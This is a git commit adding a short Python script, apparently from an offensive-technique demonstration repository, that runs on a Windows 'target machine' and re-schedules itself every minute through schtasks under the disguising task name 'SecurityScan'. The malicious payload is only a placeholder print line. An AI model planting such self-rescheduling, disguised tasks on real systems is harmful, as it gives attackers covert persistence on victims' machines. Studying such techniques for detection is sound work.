ea7e2e290228a0dbd19a07fda2a8c0d60ac2fd2d
january1073 <185717411+january1073@users.noreply.github.com>
2025-02-27 19:18:13 +0100

    Create sched.py

---
+++ 02_execution/scheduled_execution/sched.py
@@ -0,0 +1,20 @@
+# Scheduled Python script to run on a Windows machine (schtasks)
+# Once delivered, create a scheduled task on the target machine
+
+import os, random
+from datetime import datetime,timedelta
+
+if os.system("schtasks /query /tn SecurityScan") == 0:
+	os.system("schtasks /delete /f /tn SecurityScan")
+
+print("I am doing malicious things")
+
+filedir = os.path.join(os.getcwd(),"sched.py")
+
+maxInterval = 1
+interval = 1+(random.random()*(maxInterval-1))
+dt = datetime.now() + timedelta(minutes=interval)
+t = "%s:%s" % (str(dt.hour).zfill(2),str(dt.minute).zfill(2))
+d = "%s/%s/%s" % (dt.month,str(dt.day).zfill(2),dt.year)
+os.system('schtasks /create /tn SecurityScan /tr "'+filedir+'" /sc once /st '+t+' /sd '+d)
+input()
